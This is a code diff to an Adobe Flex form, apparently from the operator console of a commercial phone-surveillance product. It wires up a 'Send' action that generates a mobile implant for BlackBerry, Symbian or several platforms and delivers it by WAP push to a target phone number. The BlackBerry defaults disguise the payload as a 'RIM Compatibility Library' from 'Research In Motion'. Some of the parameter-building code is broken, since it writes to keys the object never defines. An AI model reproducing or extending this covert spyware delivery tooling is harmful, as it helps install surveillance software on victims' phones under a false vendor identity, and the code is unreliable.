@@ -5,13 +5,17 @@
   <fx:Script>
     <![CDATA[
       import it.ht.rcs.console.network.controller.CollectorManager;
+      import it.ht.rcs.console.utils.AlertPopUp;
       
       import locale.R;
       
       import mx.collections.ListCollectionView;
+      import mx.managers.PopUpManager;
       
       [Bindable]
       private var urls:ListCollectionView;
+      
+      private var params:Object;
       
       public function set platform(value:*):void {
         if (value == 'blackberry' || value == 'symbian' || value == 'multiplatform')
@@ -29,12 +33,34 @@
       private function browse():void
       {
         fileReference = new FileReference();
-        fileReference.addEventListener(Event.SELECT, fileSelection);
+        fileReference.addEventListener(Event.SELECT, uploadCert);
         fileReference.browse();
       }
       
-      private function fileSelection(event:Event):void
+      private var uploadPopup:UploadPopup;
+      private function uploadCert(event:Event):void
       {
+        fileReference.addEventListener(HTTPStatusEvent.HTTP_STATUS, onUploadError);
+        fileReference.addEventListener(IOErrorEvent.IO_ERROR, onUploadError);
+        fileReference.addEventListener(SecurityErrorEvent.SECURITY_ERROR, onUploadError);
+        fileReference.addEventListener(DataEvent.UPLOAD_COMPLETE_DATA, onUploadComplete);
+        
+        uploadPopup = PopUpManager.createPopUp(this.parentDocument as DisplayObject, UploadPopup, true) as UploadPopup;
+        uploadPopup.fileReference = fileReference;
+        PopUpManager.centerPopUp(uploadPopup);
+      }
+      
+      private function onUploadComplete(event:DataEvent):void
+      {
+        PopUpManager.removePopUp(uploadPopup);
+        
+        params['sign']['cert'] = event.data;
+      }
+      
+      private function onUploadError(event:Event):void
+      {
+        PopUpManager.removePopUp(uploadPopup);
+        AlertPopUp.show(event.type);
       }
       
       private function collName(o:Object):String
@@ -43,6 +69,31 @@
           return "http://" + o['address'] + '/';
         
         return '';
+      }
+      
+      protected function send(event:MouseEvent):void
+      {        
+        params = {platform: 'wap', generate: {platforms: [parentDocument.platform], binary: {demo: demo.selected}, melt: { appname: appname.text }, deliver: {} } };
+
+        if (currentState == 'blackberry') {
+          params['binary']['name'] = nameForm.text;
+          params['binary']['desc'] = descForm.text;
+          params['binary']['vendor'] = vendorForm.text;
+          params['binary']['version'] = versionForm.text;
+        }
+        
+        if (currentState == 'symbian') {
+          params['sign']['edition'] = edition.selectedItem;
+        }
+
+        if (currentState == 'multiplatform') {
+          params['generate']['platforms'] = ['blackberry', 'android', 'winmo'];
+        }
+        
+        params['deliver']['number'] = number.text;
+        params['deliver']['url'] = url.selectedItem + appname.text;
+        params['deliver']['service'] = servindication.selected ? 'indication' : 'loading';
+        
       }
       
     ]]>
@@ -61,13 +112,13 @@
   
   <s:Form left="10" top="10">
     <s:FormItem label="Application Name">    
-      <s:TextInput text="installer"/>
+      <s:TextInput id="appname" text="installer"/>
     </s:FormItem>
     <s:FormItem label="Phone Number">    
-      <s:TextInput text=""/>
+      <s:TextInput id="number" text=""/>
     </s:FormItem>
     <s:FormItem label="URL">    
-      <s:ComboBox dataProvider="{urls}" labelFunction="collName"/>
+      <s:ComboBox id="url" dataProvider="{urls}" labelFunction="collName"/>
     </s:FormItem>
     <s:FormItem label="Service Type">    
       <s:HGroup>
@@ -80,30 +131,39 @@
     </s:FormItem>
   </s:Form>
   
-  <s:Form includeIn="blackberry" left="10" top="35">
+  <s:Form includeIn="blackberry" left="10" top="135">
     <s:FormItem label="Name">    
-      <s:TextInput text="RIM Compatibility Library" width="150"/>
+      <s:TextInput id="nameForm" text="RIM Compatibility Library" width="150"/>
     </s:FormItem>
     <s:FormItem label="Description">        
-      <s:TextInput text="RIM Compatibility Library used by applications in the App World" width="200"/>
+      <s:TextInput id="descForm" text="RIM Compatibility Library used by applications in the App World" width="200"/>
     </s:FormItem>
     <s:FormItem label="Vendor">       
-      <s:TextInput text="Research In Motion" width="150"/>
+      <s:TextInput id="vendorForm" text="Research In Motion" width="150"/>
     </s:FormItem>
     <s:FormItem label="Version">       
-      <s:TextInput text="1.1.0" width="100"/>
+      <s:TextInput id="versionForm" text="1.1.0" width="100"/>
     </s:FormItem>
   </s:Form>
   
-  <s:Form includeIn="symbian" left="10" top="35">
+  <s:Form includeIn="symbian" left="10" top="135">
     <s:FormItem label="Certificate bound to phone IMEI">    
       <s:Button width="80" label="{R.get('BROWSE')}" click="browse()"/>
+    </s:FormItem>
+    <s:FormItem label="S60 Edition">
+      <s:DropDownList id="edition" selectedIndex="0" width="80">
+        <mx:ArrayCollection>
+          <fx:String>5th3rd</fx:String>
+          <fx:String>3rd</fx:String>
+          <fx:String>5th</fx:String>
+        </mx:ArrayCollection>
+      </s:DropDownList>
     </s:FormItem>
   </s:Form>
   
   <s:HGroup left="10" bottom="0" right="10" horizontalAlign="right">
     <s:CheckBox left="10" id="demo" label="Demo Mode" fontWeight="bold"/>
-    <s:Button right="10" label="Send..."/>    
+    <s:Button right="10" label="Send..." click="send(event)"/>    
   </s:HGroup>
   
 </s:Group>
